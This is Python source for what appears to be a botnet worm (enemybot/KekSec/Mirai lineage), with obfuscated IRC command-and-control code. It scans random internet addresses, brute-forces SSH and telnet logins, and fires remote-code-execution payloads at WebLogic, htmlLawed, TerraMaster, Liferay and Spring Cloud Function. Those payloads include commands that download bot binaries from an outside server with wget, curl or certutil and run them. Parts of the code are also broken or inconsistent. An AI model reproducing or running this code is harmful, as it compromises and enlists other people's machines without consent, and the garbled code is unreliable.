                    elif FdAoOldyPg[1]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x2b\x4a\x09\x01\x00\x02\x75\x01\x2b')) or FdAoOldyPg[1]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x2b\x4d\x0c\x00\x00\x02\x74\x01\x27')) or FdAoOldyPg[1]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x2b\x4a\x0b\x00\x00\x02\x75\x01\x29')):
                        if dPvOAiUfH == 0:
                            self.AbJppCRv.send(bytes(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xe3\x96\xd1\x56\x0f\x4a\x08\x48\x08\x13\xf1\x05\x00\x0d\x5c\x02\x93'))) % (self.lAyMzJrw,self.TbdfKqvM))
                            dPvOAiUfH = 1
                    elif FdAoOldyPg[1]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x2b\x4d\x08\x04\x00\x02\x73\x01\x27')):
                        self.VwkBkdwM=nOhicxouNLp(random.randrange(8,12))
                        self.hLqhZnCt="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.VwkBkdwM)
                        self.AbJppCRv.send("NICK %s\n" % self.hLqhZnCt)
                    if HFpPabdolog==-1:
                        try:
                            if FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\xe5\x63\x13\xd5\xf1\x05\x00\x07\x94\x01\x9b')):
                                if FdAoOldyPg[4]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xb3\xb6\xe1\xe7\x96\x56\x08\x57\x15\xe0\xd7\xe4\xe0\x8b\x56\xd3\x02\x00\x13\xc2\x02\x52')):
                                    HFpPabdolog=1024
                                    self.AbJppCRv.send(bytes(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x76\x34\xb5\xe6\x95\x96\xb6\x77\x32\x91\xe2\xd0\x74\x17\x74\x54\x32\x60\x97\x62\x54\x0e\xd3\xa9\x04\x00\x88\x92\x07\x06')) % (self.lAyMzJrw)))
                                else:
                                    self.AbJppCRv.send(bytes(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x76\x34\xb5\xe6\x95\x96\xb6\x77\x32\x91\xe2\xd0\x74\x67\x09\xd5\xb0\x67\xe7\xad\x00\x00\x6f\x67\x06\x6e')) % (self.lAyMzJrw)))
                        except:
                            pass
                    if HFpPabdolog > 0:
                        self.iPsdSFxEcg(FdAoOldyPg)
            except Exception as e:
                print(str(e.stacktrace()))
def isacKsZZoFm(cRUPNufHOGDW):
    if os.name != "nt":
        try:
            os.kill(cRUPNufHOGDW, 0)
        except OSError:
            return
    else:
        return cRUPNufHOGDW
def aLeqkKYPuQS(imaGyyFFVg):
    if os.path.exists(imaGyyFFVg):
        cRUPNufHOGDW = int(open(imaGyyFFVg).read())
        if isacKsZZoFm(cRUPNufHOGDW) and os.name == "linux":
            dacaipQNYYDq=open(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x53\x16\x60\x13\xcc\x0a\x50\x95\x67\xcc\x60\xe1\x0f\xd0\xb5\xe2\xe1\x01\x00\x1f\x2d\x03\x02')), "rb")
            QoyjcuVOld=dacaipQNYYDq.read()
            dacaipQNYYDq.close()
            if GJyOUedik == QoyjcuVOld:
                os.kill(os.getpid(),9)
        else:
            os.remove(imaGyyFFVg)
    open(imaGyyFFVg, 'w').write(str(os.getpid()))
    return imaGyyFFVg
print(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x53\x16\x60\x13\xcc\x0a\x50\x95\x67\xcc\x60\xe1\x0f\xd0\xb5\xe2\xe1\x01\x00\x1f\x2d\x03\x02')))
print(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\xe7\x61\x60\x30\xe5\x75\x92\x90\xe5\x10\xe0\xe7\x4e\x50\x91\x66\xb6\xe5\x00\x00\x18\x42\x02\x4e')))
lIIxLNHT()
print("FORKS COLLAPSED [!][0]\n")
aLeqkKYPuQS(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\xe7\x61\x60\x30\xe5\x75\x92\x90\xe5\x10\xe0\xe7\x4e\x50\x91\x66\xb6\xe5\x00\x00\x18\x42\x02\x4e')))
XLiAoDIgHc()

    
# Function to send messages to the channel
def send_message(message):
    ircsock.send(bytes(f"PRIVMSG {channel} :{message}\r\n", "UTF-8"))

global server
global channel
global ip
global key
global botnick
global serverip
global binprefix
global binname
global nameprefix
global echo
global tftp
global wget
global logins
global wizard_made
global ran
global ip
global fh
# Scanner
global honeycheck, exploited
honeycheck = 1
exploited = 0
global w
# YESSSSS, I got ghosts: change their souls leftover spirit energy and change it into my bodily energy.
# I used to listen to ICP alot to, started again


# WIZARD MAGIC RUNNING HERE 81-Bykers->HA>-->=SCRAM-="
w = "Wizard warning - Freak is a powerful real world wizard that uses Chi energy and meditation and prayer for all my power. KekSec ROX!"
wizard_made = w = 0
ip = ""
server = serverip = "bofh.nl.smurfnet.ch"
nameprefix = "enemy"
binprefix = "/" + nameprefix
binname = binprefix.split("/")[-1]
fh = open("bots.txt","a+")

def chunkify(lst,n):
    return [ lst[i::n] for i in xrange(n) ]
global running
running = 0

wizard_made = []
tftp = 0
wget = 0
echo = 0
logins = 0
ran = 0
def printStatus():
    global echo
    global tftp
    global wget
    global logins
    global ran
    while 1:
        time.sleep(5)
        print("\033[32m[\033[31m+\033[32m] Logins: " + str(logins) + "     Ran:" + str(ran) + "  Echoes:" + str(echo) + " Wgets:" + str(wget) + " TFTPs:" + str(tftp) + "\033[37m")

def readUntil(tn, advances, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        for advance in advances:
            if advance in buf: return buf
    return ""

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

def contains(data, array):
    for test in array:
        if test in data:
            return True
    return False

def split_bytes(s, n):
    assert n >= 4
    start = 0
    lens = len(s)
    while start < lens:
        if lens - start <= n:
            yield s[start:]
            return # StopIteration
        end = start + n
        assert end > start
        yield s[start:end]
        start = end



class FileWrapper():
    def __init__(self, f):
        self.f = f

    # blindly read n bytes from the front of the file
    def read(self, n):
        result = self.f.read(n)
        return result

    # read n bytes from the next alignment of k from start
    def read_align(self, n, k=None, start=0):
        # if no alignment specified, assume aligned to n
        if not k:
            k = n
        remainder = self.f.tell() % k
        num_pad = (k-remainder) % k
        pad = self.read(num_pad)
        result = self.read(n)
        return result

    # unpack the data using the endian
    def read_uint(self, n, endian):
        result = self.read_align(n)
        unpk_byte = ""
        if endian == 1:
            unpk_byte = "<"
        elif endian == 2:
            unpk_byte = ">"
        else:
            unpk_byte = "@"
        format_ = unpk_byte+"B"*n
        return unpack(format_, result)

    def seek(self, offset):
        self.f.seek(offset)

    def tell(self):
        return self.f.tell()
   
class ElfHeader():
    def __init__(self, e_ident):
        f=open(".tempelf", "wb")
        f.write(e_ident)
        f.close()
        f=open(".tempelf", "rb")
        self.f = FileWrapper(f)
        self.e_ident = self.f.read(16)     #unsigned char
        assert(self.e_ident[0:4] == "\x7fELF")
        EI_CLASS = ord(self.e_ident[4])
        # 1 means little endian, 2 means big endian
        EI_DATA = ord(self.e_ident[5])
        if EI_DATA == 1:
            self.endian = 1
        elif EI_DATA == 2:
            self.endian = 2
        else:
            assert(False)
        # this should be 1
        EI_VERSION = ord(self.e_ident[6])
        assert(EI_VERSION == 1)
        # see the tables at http://www.sco.com/developers/gabi/latest/ch4.eheader.html
        EI_OSABI = self.e_ident[7]
        EI_ABIVERSIO = self.e_ident[8]
        self.e_type = None      #Elf32_Half
        self.e_machine = None       #Elf32_Half
        self.e_version = None       #Elf32_Word
        self.e_entry = None     #Elf32_Addr
        self.e_phoff = None     #Elf32_Off
        self.e_shoff = None     #Elf32_Off
        self.e_flags = None     #Elf32_Word
        self.e_ehsize = None        #Elf32_Half
        self.e_phentsize = None     #Elf32_Half
        self.e_phnum = None     #Elf32_Half
        self.e_shentsize = None     #Elf32_Half
        self.e_shnum = None     #Elf32_Half
        self.e_shstrndx = None      #Elf32_Half

    def parse_header(self):

        #Magic number
        assert(self.e_ident[0:4] == "\x7fELF")
        # 1 means 32, 2 means 64
        EI_CLASS = ord(self.e_ident[4])
        #TODO: Are these the right sizes to put here?
      
        # 1 means little endian, 2 means big endian
        EI_DATA = ord(self.e_ident[5])
        self.bytes = EI_CLASS
        # this should be 1
        EI_VERSION = ord(self.e_ident[6])
        # see the tables at http://www.sco.com/developers/gabi/latest/ch4.eheader.html
        EI_OSABI = self.e_ident[7]
        EI_ABIVERSIO = self.e_ident[8]

        #Parse the rest of the header
        self.e_type = self.Half(self.f)
        self.e_machine = self.Half(self.f)

        section = {}
        section["e_machine"] = self.e_machine
        section["endian"] = self.endian
        return section

    def Half(self, f):
        return self.f.read_uint(2, self.endian)


honeycheck = 1
global badips
badips=[]
def fileread():
    fh=open("honeypots.txt", "rb")
    data=fh.read()
    fh.close()
    return data
def clientHandler(c, addr):
    global badips
    try:
        if addr[0] not in badips and addr[0] not in fileread():
            print(addr[0] + ":" + str(addr[1]) + " has connected!")
            request = recvTimeout(c, 8912)
            if "curl" not in request and "Wget" not in request:
                if addr[0] not in fileread():
                    fh=open("honeypots.txt", "a")
                    fh.write(addr[0]+"\n")
                    fh.close()
                    os.popen("iptables -A INPUT -s " + addr[0] + " -j DROP")
                badips.append(addr[0])
                print(addr[0] + ":" + str(addr[1]) + " is a fucking honeypot!!!")
                c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
                for i in range(10):
                    c.send(os.urandom(65535*2))
        else:
            c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
            for i in range(10):
                c.send(os.urandom(65535*2))
        c.close()
    except Exception as e:
        #print str(e)
        pass

def honeyserver(honeyport):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', honeyport))
    s.listen(999999999)
    while 1:
        try:
            c, addr = s.accept()
            Thread(target=clientHandler, args=(c, addr,)).start()
        except:
            pass

def scanner():
    global honeycheck, exploited
    honeycheck = 1
    exploited = 0
    while 1:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            try:
                cheese = str(random.randint(1,233)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255))
                s.connect((cheese, 22))
                exploited=exploit(cheese)
                wizard_made+=1
            except:
                try:
                    s.connect((cheese, 23))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 2323))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 8080))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 8081))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 53))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 135))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 139))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 445))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
        except Exception as e:
            print(str(e))
            pass
            
if honeycheck==1:
    Thread(target=honeyserver, args=(8080,)).start()

def infect(ip, port=23, username="", password=""):
    global running
    global echo
    global tftp
    global wget
    global logins
    global wizard_made
    global server
    if ip in wizard_made:
        return
    infectedkey = "PERROR"

    if str(port)==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x2b\x4d\x0f\x04\x00\x02\x81\x01\x2e')):
        url = wzihKxgDoV(zlib.decompress(b'\x78\x9c\xd3\x54\x17\x93\x64\xac\xe7\xc9\x07\x00\x05\x6a\x01\x7b'))+ip+":"+str(port)
    else:
        url = wzihKxgDoV(zlib.decompress(b'\x78\x9c\xd3\x54\x17\x93\xf4\xc8\xe2\x01\x00\x04\x9a\x01\x3e'))+ip+":"+str(port)
    
    global cmd_dlexe, passwd
    cmd_dlexe = commandx86 = urllib.parse.quote("wget http://%s/enemybotx86 -O enemy;chmod 0755 enemybotx86;./enemybotx86" % server)
    cmd_dlexe = cmd_dlexearm64 = command = urllib.parse.quote("wget http://%s/enemybotarm64;chmod 0755 enemybotarm64;./enemybotarm64;wget http://%s/enemybot%s;chmod 0755 enemybot%s;./enemybot%s;logout" % server, server, "arm64", "arm64", "arm64")
    cmd_dlexe = cmd_dlexearm = command = urllib.parse.quote("wget http://%s/enemybotarm;chmod 0755 enemybotarm;./enemybotarm;rm -rf enemybotarm;wget http://%s/enemybot%s;chmod 0755 enemybot%s;./enemybot%s;logout" % server, server, "arm64", "arm64", "arm64")
    
    request = requests.session()
    headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}
    print("[+] Sending GET Request for weblogic ....")
    try:
        GET_Request = request.get(target + "/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('" + command + "');\");", verify=False, headers=headers)
        print("[$] Exploit successful! Hooray..")
    except:
        pass
    print("[+] Sending htmlLawed 1.2.5 exploit ....")
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((target, 443))
        s=ssl.wrap_socket(s)
        s.send("POST / HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: curl/8.10.1\r\nAccept: */*\r\nCookie: sid=foo\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nsid=foo&hhook=exec&text=" + command)
        s.recv(1024)
        s.close()
        print("[+] Successful sending! Lets hope it worx!")
    except:
        pass
    print("[-] Exploits have failed !! now SSH bruting....")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((target, 22))
        s=ssl.wrap_socket(s)
        fgh=open(sshcommand, "a+")
        fgh.write(target + "\r\n")
        fgh.close()
        s.close()
    except:
        return
    try:
        for result in passwd:
            try:
                result = result.split(" ")
                ssh.connect(target, result[0], password=result[1])
                stdin, stdout, stderr = ssh.exec_command('system')
                stdin, stdout, stderr = ssh.exec_command('enable')
                stdin, stdout, stderr = ssh.exec_command('push')
                stdin, stdout, stderr = ssh.exec_command('root')
                stdin, stdout, stderr = ssh.exec_command('admin')
                stdin, stdout, stderr = ssh.exec_command('telnetd')
                stdin, stdout, stderr = ssh.exec_command('cat | sh')
                stdin, stdout, stderr = ssh.exec_command(cmd_dlexe)
                x = stdout.readlines()
                print(x)
                for line in x:
                    print(line)
            except:
                pass
            ssh.close()
    except:
        pass
    try:
        headers=requests.get(url).headers
        servertype=requests.get(url).headers['Server']
        if servertype == "TNAS":
            s = requests.Session()
            s.headers.update({"user-device":"TNAS", "user-agent":"TNAS"})
            r=s.post(f"{target}/module/api.php?mobile/wapNasIPS")
            try:
                j = r.json()
                PWD = j["data"]["PWD"]
                MAC_ADDRESS = j["data"]["ADDR"]
            except KeyError:
                raise(Exception)
            TIMESTAMP = str(int(time.time()))
            s.headers.update({"signature": tos_encrypt_str(TIMESTAMP), "timestamp": TIMESTAMP})
            s.headers.update({"authorization": PWD})
            #RCEs
            terramasterRCEs=[f"{target}/tos/index.php?app/del&id=0&name=;{cmd_dlexearm64};xx%23",
                  f"{target}/tos/index.php?app/hand_app&name=;{cmd_dlexearm64};xx.tpk", #BLIND
                  f"{target}/tos/index.php?app/app_start_stop&id=ups&start=0&name=donotcare.*.oexe;{cmd_dlexearm64};xx"] #BLIND                
            for urltohack in terramasterRCEs:
                r = s.get(RCEs[args.rce])
                content = str(r.content, "utf-8")
                if "<!--user login-->" not in content: 
                    print(content)
        if "Liferay-Portal" in headers:
            headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*"}
            response = session.get(""+target+"/api/jsonws/invoke", headers=headers,verify=False)
            if "Unable to deserialize object" in response.text:
                paramsPost = {"p_auth":"AdsXeCqz","tableId%3d1":"","formDate":"1526638413000","columnId":"123","defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource":"{\"userOverridesAsString\":\"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878;\"}","name":"A","cmd":"{\"/expandocolumn/update-column\":{}}","type":"1"}
                headers2 = {"Connection":"close","cmd2":cmd_dlexe,"Content-Type":"application/x-www-form-urlencoded"}
                response2 = session.post(""+target+"/api/jsonws/invoke", data=paramsPost, headers=headers2,verify=False)
    except:
        pass
    STZoFYcU(ip, port)
    avolTTpw=["T(java.lang.Runtime).getRuntime().exec(\"certutil -urlcache -split -f " + hVDRooIdLP + " svchost.exe\")", "T(java.lang.Runtime).getRuntime().exec(\"svchost.exe\")"]
    for part in avolTTpw:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"POST /functionRouter HTTP/1.1\nHost: " + ip + ":" + str(port) + "\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: " + random.choice(self.GbASkEbE) + "\nspring.cloud.function.routing-expression: " + part + "\nContent-Length: 5\nContent-Type: application/x-www-form-urlencoded\n\ndata=")
        s.recv(1)
        s.close()
    global running, cheese
    running += 1
    threadID = running
    while 1:
        cheese = str(random.randint(1,233)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255))
        port1 = 22
        port2 = 2222
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.37)
        try:
            s.connect((cheese, port1))
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(cheese, port = port1, username=username, password=password, timeout=3)
            ssh.exec_command(rekdevice)
            ssh.close()
        except paramiko.ssh_exception.SSHException as e:
            print(str(e))
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(cheese, port = port2, username=username, password=password, timeout=3)
            ssh.exec_command(rekdevice)
            ssh.close()
        except paramiko.ssh_exception.SSHException as e:
            print(str(e))
        try:
            threading.Thread(target = infect, args=(cheese, port1, username, password)).start()           
            print(b'[LIVE] [+] -------> Server IP address: -> {cheese}:{port1} + ~SSH Infection-=-=')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)
            s.connect((cheese, port2))
            s.close()
            threading.Thread(target = infect, args=(cheese, port2, username, password)).start()
            infect(cheese, port2, username, password)            
            print(b'[LIVE] [+] -------> Server IP address 2: -> {cheese}:{port2} + ~Hidden Infection-=-=')
            print(b'Server IP address: {cheese} {port2}')
            s.close()
        except Exception as e:
            print(str(e))
            running -= 1
    try:
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(username + "\r\n")
            time.sleep(0.1)
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(password + "\r\n")
            time.sleep(0.8)
        else:
            pass
        prompt = ''
        prompt += recvTimeout(tn, 8192)
        if ">" in prompt and "ONT" not in prompt:
            success = True
        elif "#" in prompt or "$" in prompt or "@" in prompt or ">" in prompt:
            if "#" in prompt:
                prompt = "#"
            elif "$" in prompt:
                prompt = "$"
            elif ">" in prompt:
                prompt = ">"
            success = True
        else:
            tn.close()
            return
    except:
        tn.close()
        return
    if success == True:
        try:
            tn.send("enable\r\n")
            tn.send("system\r\n")
            tn.send("shell\r\n")
            tn.send("sh\r\n")
            tn.send("echo -e '\\x41\\x4b\\x34\\x37'\r\n")
        except:
            tn.close()
            return
        time.sleep(1)
        try:
            buf = recvTimeout(tn, 8192)
        except:
            tn.close()
            return
        if "AK47" in buf:
            if honeycheck == 1:
                tn.send("wget http://" +serverip + ":" + str(8080) + "/bins/mirai.arm; chmod 0777 mirai.arm;ls mirai.arm; ./mirai.arm &\r\n");
                tn.send("curl http://" +serverip + ":" + str(8080) + "/bins/mirai.arm; chmod 0777 mirai.arm;ls mirai.arm; ./mirai.arm &\r\n");
                time.sleep(3)
                recvTimeout(tn, 8192)
                if ip in badips:
                    running -= 1
                    return
            tn.send("cd /tmp ; cd /home/$USER ; cd /var/run ; cd /mnt ; cd /root ; cd /\r\n")
            tn.send("cat /proc/mounts;busybox cat /proc/mounts\r\n")
            mounts = recvTimeout(tn, 1024*1024)
            for line in mounts.split("\n"):
                try:
                    path = line.split(" ")[1]
                    if " rw" in line:
                        tn.send("echo -e '%s' > %s/.keksec; cat %s/.keksec;busybox cat %s/.keksec; rm %s/.keksec;busybox rm %s/.keksec\r\n" % ("\\x41\\x4b\\x34\\x37", path, "\\x41\\x4b\\x34\\x37", path, path, path, path, path))
                        if "AK47" in recvTimeout(tn, 1024*1024):
                            tn.send("cd %s\r\n" % path) #cd into the writeable directory
                except:
                    continue
            try:
                data=""
                tn.send("echo -en \"START\"\r\n")
                c = 0
                while 1:
                    data+=recvTimeout(tn, 100)
                    if data=="":
                        running -= 1
                        try:
                            tn.close()
                        except:
                            pass
                        return
                    if "START" in data:
                        break
                tn.send("PS1= ; cat /bin/echo ; busybox cat /bin/echo\r\n")
                data=""
                data+=recvTimeout(tn, 0xff00)
                st=0
                while st<len(data):
                    if data[st] == "\x7f":
                        data=data[st:(len(data) % 0xff00)]
                        continue
                    else:
                        st+=1
                elfheader=data[data.find("ELF")-1:(len(data) % 0xff00)]
                if elfheader[0:4]!="\x7fELF":
                    running -= 1
                    try:
                        tn.close()
                    except:
                        pass
                    return
            except:
                running -= 1
                try:
                    tn.close()
                except:
                    pass
                return
            try:
                header = ElfHeader(elfheader).parse_header()
                EM_NONE = 0
                EM_M32 = 1
                EM_SPARC = 2
                EM_386 = 3
                EM_68K = 4 #// m68k
                EM_88K = 5 #// m68k
                EM_486 = 6 #// x86
                EM_860 = 7 #// Unknown
                EM_MIPS = 8 #/* MIPS R3000 (officially, big-endian only) */
                #/* Next two are historical and binaries and modules of these types will be rejected by Linux. */
                EM_MIPS_RS3_LE = 10 #/* MIPS R3000 little-endian */
                EM_MIPS_RS4_BE = 10 #/* MIPS R4000 big-endian */
                EM_PARISC = 15 #/* HPPA */
                EM_SPARC32PLUS = 18 #/* Sun's "v8plus" */
                EM_PPC = 20 #/* PowerPC */
                EM_PPC64 = 21 #/* PowerPC64 */
                EM_SPU = 23 #/* Cell BE SPU */
                EM_ARM = 40 #/* ARM 32 bit */
                EM_SH = 42 #/* SuperH */
                EM_SPARCV9 = 43 #/* SPARC v9 64-bit */
                EM_H8_300 = 46 #/* Renesas H8/300 */
                EM_IA_64 = 50 #/* HP/Intel IA-64 */
                EM_X86_64 = 62 #/* AMD x86-64 */
                EM_S390 = 22 #/* IBM S/390 */
                EM_CRIS = 76 #/* Axis Communications 32-bit embedded processor */
                EM_M32R = 88 #/* Renesas M32R */
                EM_MN10300 = 89 #/* Panasonic/MEI MN10300, AM33 */
                EM_OPENRISC = 92 #/* OpenRISC 32-bit embedded processor */
                EM_BLACKFIN = 106 #/* ADI Blackfin Processor */
                EM_ALTERA_NIOS2 = 113 #/* Altera Nios II soft-core processor */
                EM_TI_C6000 = 140 #/* TI C6X DSPs */
                EM_AARCH64 = 183 #/* ARM 64 bit */
                EM_TILEPRO = 188 #/* Tilera TILEPro */
                EM_MICROBLAZE = 189 #/* Xilinx MicroBlaze */
                EM_TILEGX = 191 #/* Tilera TILE-Gx */
                EM_FRV = 0x5441 #/* Fujitsu FR-V */
                EM_AVR32 = 0x18ad #/* Atmel AVR32 */
                if (header["e_machine"][0] == EM_ARM or header["e_machine"][0] == EM_AARCH64):
                    arch = "arm"
                elif (header["e_machine"][0] == EM_MIPS or header["e_machine"][0] == EM_MIPS_RS3_LE):
                    if (header["endian"] == 1):
                        arch = "mpsl"
                    else:
                        arch = "mips"
                elif (header["e_machine"][0] == EM_386 or header["e_machine"][0] == EM_486 or header["e_machine"][0] == EM_860 or header["e_machine"][0] == EM_X86_64):
                    arch = "x86"
                elif (header["e_machine"][0] == EM_SPARC or header["e_machine"][0] == EM_SPARC32PLUS or header["e_machine"][0] == EM_SPARCV9):
                    arch = "spc"
                elif (header["e_machine"][0] == EM_68K or header["e_machine"][0] == EM_88K):
                    arch = "m68k"
                elif (header["e_machine"][0] == EM_PPC or header["e_machine"][0] == EM_PPC64):
                    arch = "ppc"
                elif (header["e_machine"][0] == EM_SH):
                    arch = "sh4"
                try:
                    arch
                except NameError:
                    try:
                        tn.close()
                    except:
                        pass
                    running -= 1
